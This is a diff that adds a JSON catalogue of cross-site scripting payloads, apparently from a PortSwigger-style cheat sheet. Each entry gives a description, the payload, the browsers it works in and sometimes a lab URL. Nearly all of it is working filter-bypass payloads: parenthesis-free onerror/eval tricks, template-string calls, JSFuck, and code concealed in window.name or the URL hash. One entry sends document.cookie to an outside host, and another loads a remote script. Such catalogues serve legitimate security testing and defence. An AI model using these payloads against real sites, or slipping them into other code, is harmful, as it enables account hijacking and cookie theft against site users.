@@ -1,0 +1,330 @@
+[
+  {
+    "description": "No parentheses using exception handling",
+    "code": "<script>onerror=alert;throw 1</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": ""
+  },
+  {
+    "description": "No parentheses using exception handling no semi colons",
+    "code": "<script>{onerror=alert}throw 1</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": ""
+  },
+  {
+    "description": "No parentheses using exception handling no semi colons using expressions",
+    "code": "<script>throw onerror=alert,1</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": ""
+  },
+  {
+    "description": "No parentheses using exception handling and string eval on Chrome / Edge",
+    "code": "<script>throw onerror=eval,'=alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "edge"]
+  },
+  {
+    "description": "No parentheses using exception handling and string eval on Safari",
+    "code": "<script>throw onerror=eval,'alert\\x281\\x29'</script>",
+    "browsers": ["safari"]
+  },
+  {
+    "description": "No parentheses using exception handling and object eval on Firefox",
+    "code": "<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\\x281\\x29'}</script>",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "No parentheses using exception handling and object eval on Firefox / Safari",
+    "code": "<script>throw onerror=eval,e=new Error,e.message='alert\\x281\\x29',e</script>",
+    "browsers": ["firefox", "safari"]
+  },
+  {
+    "description": "No parentheses using exception handling and location hash eval on all browsers",
+    "code": "<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "hash": "#*/;alert(1);"
+  },
+  {
+    "description": "No parentheses, no quotes, no spaces using exception handling and location hash eval on all browsers",
+    "code": "<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "hash": "#*/;alert(1);"
+  },
+  {
+    "description": "No parentheses, no quotes, no spaces, no curly brackets using exception handling and location hash eval on all browsers",
+    "code": "<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "hash": "#*/;alert(1);"
+  },
+  {
+    "description": "No parentheses using ES6 hasInstance and instanceof with eval",
+    "code": "<script>'alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": ""
+  },
+  {
+    "description": "No parentheses using ES6 hasInstance and instanceof with eval without .",
+    "code": "<script>'alert\\x281\\x29'instanceof{[Symbol['hasInstance']]:eval}</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": ""
+  },
+  {
+    "description": "No parentheses using location redirect",
+    "code": "<script>location='javascript:alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": ""
+  },
+  {
+    "description": "No parentheses using location redirect no strings",
+    "code": "<script>location=name</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": "http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20name=javascript:alert(1)%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cscript%3Elocation=name%3C/script%3E%22%3E%3C%2Fiframe%3E"
+  },
+  {
+    "description": "No parentheses using template strings",
+    "code": "<script>alert`1`</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": ""
+  },
+  {
+    "description": "No parentheses using template strings and location hash",
+    "code": "<script>new Function`X${document.location.hash.substr`1`}`</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "hash": "#alert(1)"
+  },
+  {
+    "description": "No parentheses or spaces, using template strings and location hash",
+    "code": "<script>Function`X${document.location.hash.substr`1`}```</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "hash": "#alert(1)"
+  },
+  {
+    "description": "XSS cookie exfiltration without parentheses, backticks or quotes",
+    "code": "<video><source onerror=location=/\\02.rs/+document.cookie>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "XSS without greater than",
+    "code": "<svg onload=alert(1) ",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "XSS without greater using a HTML comment",
+    "code": "<svg onload=alert(1)<!--",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Array based destructuring using onerror",
+    "code": "<script>throw[onerror]=[alert],1</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Destructuring using onerror",
+    "code": "<script>var{a:onerror}={a:alert};throw 1</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Destructuring using default values and onerror",
+    "code": "<script>var{haha:onerror=alert}=0;throw 1</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Vector using window.name",
+    "code": "<script>window.name='javascript:alert(1)';</script><svg onload=location=name>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Avoiding Invalid left-hand side in assignment without  `, (), ?, [], or , using object literal",
+    "code": "<script>window.name='javascript:alert(1)';function blah(){}\nblah(\"\"+{a:location=name}+\"\")</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Avoiding Invalid left-hand side in assignment without  `, (), ?, [], or , using new class",
+    "code": "<script>window.name='javascript:alert(1)';function blah(){}\nblah(\"\"+new class b{toString=e=>location=name}+\"\")</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Script tag using only uppercase",
+    "code": "<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Script tag using only uppercase using JSFuck and inline",
+    "code": "<SCRIPT>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</SCRIPT>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "window.name with onerror and throw",
+    "code": "<script>throw onerror=eval,name</script>",
+    "browsers": ["chrome", "edge"],
+    "url": "http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ename=%22=alert(1)%22;location=%22https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror=eval,name%3C%5C/script%3E%22%3C/script%3E"
+  },
+  {
+    "description": "location with onerror and throw",
+    "code": "<script>throw onerror=eval,'/*'+location</script>",
+    "browsers": ["chrome", "edge"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror=eval,%27/*%27%2blocation%3C/script%3E#*/=alert(1)//"
+  },
+  {
+    "description": "SVG with onerror, throw and document.URL",
+    "code": "<svg onload=\"throw top.onerror=eval,'/*'+URL\">",
+    "browsers": ["chrome", "edge"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=%22throw%20top.onerror=eval,%27/*%27%2bURL%22%3E#*/=alert(1)//"
+  },
+  {
+    "description": "body with onerror, throw and location",
+    "code": "<body onload=\"throw onerror=eval,'/*'+location\">",
+    "browsers": ["chrome", "edge"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onload=%22throw%20onerror=eval,%27/*%27%2blocation%22%3E#*/=alert(1)//"
+  },
+  {
+    "description": "ondevicemotion and URIError object",
+    "code": "<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "edge"]
+  },
+  {
+    "description": "ondeviceorientation and Error object",
+    "code": "<script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "edge"]
+  },
+  {
+    "description": "ondeviceorientationabsolute and WebTransportError object",
+    "code": "<script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "edge"]
+  },
+  {
+    "description": "onpagereveal and AggregateError object",
+    "code": "<script>onpagereveal=setTimeout;Event.prototype.toString=AggregateError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "edge"]
+  },
+  {
+    "description": "onpageswap and EvalError object",
+    "code": "<script>onpageswap=setTimeout;location='x';Event.prototype.toString=EvalError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "edge"]
+  },
+  {
+    "description": "onmessage and RangeError object",
+    "code": "<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name=\"alert\\x281\\x29\">';target.onload=setTimeout(function(){frames[0].postMessage(\"\", \"*\")},100)</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20id=target%3E%3C/iframe%3E%3Cscript%3Etarget.src=%27xss.php?x=%3Cimg/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name=%22alert%5Cx281%5Cx29%22%3E%27;target.onload=setTimeout(function()%7Bframes%5B0%5D.postMessage(%22%22,%20%22*%22)%7D,100)%3C/script%3E"
+  },
+  {
+    "description": "onhashchange and Regex object",
+    "code": "<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags='.call\\x28alert\\x281\\x29\\x29';Event.prototype.toString=/x/.toString</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onscroll and ReferenceError object",
+    "code": "<script>onscroll=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=ReferenceError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onscrollend and SyntaxError object",
+    "code": "<script>onscrollend=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=SyntaxError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onselect and TypeError object",
+    "code": "<input value=x autofocus onfocus=\"window.onselect=setTimeout;this.selectionStart=1;Event.prototype.toString=TypeError.prototype.toString;Event.prototype.message='alert\\x281\\x29'\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "ontransitionstart / ontransitionend / ontransitionrun and Arrow function",
+    "code": "<img/src/style=transition:0.1s onerror=\"window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>'alert\\x281\\x29'\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onload and DOMException object",
+    "code": "<img/src/onerror=\"window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\\x281\\x29'\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onpageshow and WebTransportError object",
+    "code": "<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\\x281\\x29'>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onerror and ReferenceError without throw",
+    "code": "<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\\x281\\x29;var\\x20Uncaught//';z>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "SVG onerror and XSS new constructor",
+    "code": "<svg onload=onerror=eval;new'\"-alert\\x281\\x29//'>",
+    "browsers": ["safari"]
+  },
+  {
+    "description": "onerror and new operator on window name",
+    "code": "<script>onerror=eval,new name</script>",
+    "browsers": ["safari"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href=%22//subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%3Eonerror=eval,new%20name%3C/script%3E%22target=%27%22-alert(1)//%27%3Etest%3C/a%3E"
+  },
+  {
+    "description": "onerror and Error object on Firefox and Safari",
+    "code": "<script>throw onerror=eval,x=new Error,x.message='alert\\x281\\x29',x</script>",
+    "browsers": ["safari", "firefox"]
+  },
+  {
+    "description": "onerror and Error object on Chrome",
+    "code": "<script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\\x281\\x29',x</script>",
+    "browsers": ["chrome"]
+  },
+  {
+    "description": "Redefining onerror and concealing the payload in attributes",
+    "code": "<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>",
+    "browsers": ["chrome", "firefox", "safari", "edge"]
+  },
+  {
+    "description": "Attributes and SVG with payload concealed in window name",
+    "code": "<svg onload=\"attributes[0].value=name,new onload\">",
+    "browsers": ["chrome", "firefox", "safari", "edge"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ename=%27alert(1)%27;location=%27//subdomain1.portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=%22attributes[0].value=name,new%20onload%22%3E%27;%3C/script%3E"
+  },
+  {
+    "description": "Attributes and SVG and onload event with payload concealed in URL and template strings",
+    "code": "<svg onload=\"attributes[0].value=id+URL+id,new onload\" id=`>",
+    "browsers": ["chrome", "firefox", "safari", "edge"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=%22attributes[0].value=id%2bURL%2bid,new%20onload%22%20id=%60%3E",
+    "hash": "#${alert(1)}"
+  },
+  {
+    "description": "Attributes and input with onfocus event with payload concealed in URL and template strings",
+    "code": "<input onfocus=\"attributes[0].value=id+URL+id,new onfocus\" id=` autofocus>",
+    "browsers": ["chrome", "firefox", "safari", "edge"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20onfocus=%22attributes[0].value=id%2bURL%2bid,new%20onfocus%22%20id=%60%20autofocus%3E",
+    "hash": "#${alert(1)}"
+  },
+  {
+    "description": "Attributes and input with onclick event with payload concealed in URL and template strings requires two clicks",
+    "code": "<input onclick=attributes[0].value='`'+URL+'`'>",
+    "browsers": ["chrome", "firefox", "safari", "edge"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20onclick=attributes[0].value=%27%60%27%2bURL%2b%27%60%27%3Eclick%20the%20input%20twice",
+    "hash": "#${alert(1)}"
+  },
+  {
+    "description": "Form action and input with payload concealed in window name",
+    "code": "<form><input onclick=\"formAction=top.name,type='submit',new submit\">",
+    "browsers": ["chrome", "firefox", "safari", "edge"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ename=%27javascript:alert(1)%27;location=%27//subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cinput%20onclick=%22formAction=top.name,type=%5c%27submit%5c%27,new%20submit%22%3E%27;%3C/script%3E"
+  },
+  {
+    "description": "SVG and innerHTML to decode the URL then assign it with textContent payload concealed in URL",
+    "code": "<svg onload=innerHTML=URL,innerHTML=textContent>",
+    "browsers": ["chrome", "safari", "edge"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=innerHTML=URL,innerHTML=textContent%3E",
+    "hash": "#&lt;img/src/onerror=alert(1)&gt;"
+  },
+  {
+    "description": "img and innerHTML to decode the URL then assign it with textContent payload concealed in URL",
+    "code": "<img/src/onerror=innerHTML=URL,innerHTML=textContent>",
+    "browsers": ["chrome", "firefox", "safari", "edge"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cimg/src/onerror=innerHTML=URL,innerHTML=textContent%3E",
+    "hash": "#&lt;img/src/onerror=alert(1)&gt;"
+  },
+  {
+    "description": "innerHTML to decode the URL then eval it using textContent payload concealed in URL",
+    "code": "<svg onload=innerHTML=URL,eval(textContent)>",
+    "browsers": ["chrome", "firefox", "safari", "edge"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=innerHTML=URL,eval(textContent)%3E",
+    "hash": "#&NewLine;alert(1)"
+  }
+]
